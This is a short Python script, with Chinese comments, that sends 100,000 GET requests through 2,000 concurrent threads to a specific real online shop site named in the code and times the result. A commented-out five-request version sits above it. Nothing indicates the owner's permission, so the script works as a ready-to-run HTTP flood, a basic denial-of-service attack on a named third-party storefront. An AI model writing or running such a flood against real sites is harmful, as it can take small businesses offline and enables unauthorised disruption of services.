# import requests


# url = 'https://wbeautylab.1shop.tw/'
# for _ in range(5):
#     response = requests.get(url)
#     print(response.status_code)  # 打印返回的 HTTP 狀態碼
# # print(response.text)  # 打印返回的網頁內容



import time
import requests
from concurrent.futures import ThreadPoolExecutor

URL = "https://wbeautylab.1shop.tw/"

# 更新請求數量
REQUESTS_PER_SECOND = 100000  # 每秒請求數量

def send_request(_):
    try:
        response = requests.get(URL)
        return response.status_code
    except Exception as e:
        return f"Error: {e}"

if __name__ == "__main__":
    start_time = time.time()

    with ThreadPoolExecutor(max_workers=2000) as executor:  # 增加 max_workers 以處理更多並行請求
        results = list(executor.map(send_request, range(REQUESTS_PER_SECOND)))

    end_time = time.time()
    elapsed_time = end_time - start_time

    print(f"總共發送請求數: {REQUESTS_PER_SECOND}")
    print(f"實際花費時間: {elapsed_time:.2f} 秒")
